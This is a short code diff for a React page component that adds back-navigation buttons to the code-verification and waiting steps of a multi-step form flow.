@@ -5,6 +5,7 @@ import SnapForm from "@/components/SnapForm";
 import CodeVerification from "@/components/CodeVerification";
 import WaitingValidation from "@/components/WaitingValidation";
 import SuccessScreen from "@/components/SuccessScreen";
+import BackButton from "@/components/BackButton";
 import { supabase } from "@/integrations/supabase/client";
 
 type Step = "form" | "code" | "waiting" | "success" | "banned";
@@ -133,11 +134,17 @@ const Index = () => {
         )}
         
         {step === "code" && (
-          <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
+          <>
+            <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
+            <BackButton onClick={() => { setCodeError(""); setStep("form"); }} />
+          </>
         )}
         
         {step === "waiting" && (
-          <WaitingValidation />
+          <>
+            <WaitingValidation />
+            <BackButton onClick={() => setStep("code")} />
+          </>
         )}
         
         {step === "success" && (
